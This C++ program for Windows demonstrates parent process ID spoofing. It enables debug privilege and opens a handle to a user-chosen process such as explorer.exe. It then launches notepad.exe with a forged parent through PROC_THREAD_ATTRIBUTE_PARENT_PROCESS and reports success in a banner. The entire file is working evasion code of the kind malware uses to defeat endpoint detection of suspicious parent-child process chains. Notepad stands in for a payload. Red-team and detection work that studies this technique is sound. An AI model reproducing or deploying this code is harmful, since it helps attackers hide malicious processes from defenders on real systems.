#include <Windows.h>
#include "proc.h"
#include <iostream>
#include <string>

int main()
{
    // ========== PHASE 0: Enable debug privileges ==========
    if (!EnableDebugPrivilege())
    {
        std::cout << "[!] Failed to enable debug privilege (run as admin)" << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "[+] Debug privilege enabled" << std::endl;

    // ========== Display recommended processes ==========
    std::cout << "\n=== RECOMMENDED STABLE PROCESSES ===" << std::endl;
    std::cout << "1. explorer.exe   (Windows Explorer)" << std::endl;
    std::cout << "2. dwm.exe        (Desktop Window Manager)" << std::endl;
    std::cout << "3. RuntimeBroker.exe" << std::endl;
    std::cout << "=====================================\n" << std::endl;

    // ========== Get parent process name ==========
    std::string procNameAnsi;
    std::cout << "Enter parent process name: " << std::endl;
    std::cin >> procNameAnsi;

    std::wstring procNameWide(procNameAnsi.begin(), procNameAnsi.end());

    // ========== PHASE 1: Find parent process PID ==========
    DWORD parentProcId = GetProcId(procNameWide.c_str());

    if (parentProcId == 0)
    {
        std::cout << "[-] Process not found" << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "[+] Process ID: " << parentProcId << std::endl;

    // ========== PHASE 2: Open handle to parent process ==========
    HANDLE hParentProc = GetParentProcHandle(parentProcId);

    if (hParentProc == NULL)
    {
        std::cout << "[-] Failed to open handle: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "[+] Parent process handle opened" << std::endl;

    // ========== PHASE 3: Build path to notepad.exe ==========
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH))
    {
        std::cout << "[-] GetEnvironmentVariableA failed: %lu\n" << GetLastError() << std::endl;
        CloseHandle(hParentProc);
        return EXIT_FAILURE;
    }

    sprintf_s(lpPath, sizeof(lpPath), "%s\\System32\\notepad.exe", WnDr);

    // ========== PHASE 4: Initialize attribute list ==========
    SIZE_T sThreadAttList = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;

    // First call to get required size
    InitializeProcThreadAttributeList(NULL, 1, 0, &sThreadAttList);

    // Allocate memory
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        sThreadAttList
    );

    if (pThreadAttList == NULL)
    {
        printf("[-] HeapAlloc failed: %lu\n", GetLastError());
        CloseHandle(hParentProc);
        return EXIT_FAILURE;
    }

    // Initialize attribute list
    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, 0, &sThreadAttList))
    {
        printf("[-] InitializeProcThreadAttributeList failed: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, pThreadAttList);
        CloseHandle(hParentProc);
        return EXIT_FAILURE;
    }

    // ========== PHASE 5: Update attribute with parent process ==========
    if (!UpdateProcThreadAttribute(
        pThreadAttList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParentProc,
        sizeof(HANDLE),
        NULL,
        NULL
    ))
    {
        printf("[-] UpdateProcThreadAttribute failed: %lu\n", GetLastError());
        DeleteProcThreadAttributeList(pThreadAttList);
        HeapFree(GetProcessHeap(), 0, pThreadAttList);
        CloseHandle(hParentProc);
        return EXIT_FAILURE;
    }

    // ========== PHASE 6: Prepare STARTUPINFOEX ==========
    STARTUPINFOEXA SiEx = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    SiEx.lpAttributeList = pThreadAttList;

    // ========== PHASE 7: Create process with spoofed parent ==========
    printf("\n[*] Launching notepad.exe with spoofed parent...\n");

    if (!CreateProcessA(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &SiEx.StartupInfo,
        &Pi
    ))
    {
        DWORD err = GetLastError();
        printf("[-] CreateProcessA failed: %lu\n", err);

        if (err == ERROR_INVALID_PARAMETER)
            printf("[-] ERROR_INVALID_PARAMETER - Check attribute list\n");
        else if (err == ERROR_ACCESS_DENIED)
            printf("[-] ERROR_ACCESS_DENIED - Run as administrator\n");

        DeleteProcThreadAttributeList(pThreadAttList);
        HeapFree(GetProcessHeap(), 0, pThreadAttList);
        CloseHandle(hParentProc);
        return EXIT_FAILURE;
    }

    // ========== SUCCESS ==========
    printf("\n");
    printf("??????????????????????????????????????????\n");
    printf("?       PPID SPOOFING SUCCESSFUL!       ?\n");
    printf("??????????????????????????????????????????\n");
    printf("? New Process PID:    %-18lu ?\n", Pi.dwProcessId);
    printf("? Spoofed Parent PID: %-18lu ?\n", parentProcId);
    printf("? Parent Process:     %-18s ?\n", procNameAnsi.c_str());
    printf("??????????????????????????????????????????\n");

    // ========== PHASE 8: Cleanup ==========
    DeleteProcThreadAttributeList(pThreadAttList);
    HeapFree(GetProcessHeap(), 0, pThreadAttList);
    CloseHandle(Pi.hThread);
    CloseHandle(Pi.hProcess);
    CloseHandle(hParentProc);

    printf("[+] All resources cleaned up\n");

    return EXIT_SUCCESS;
}
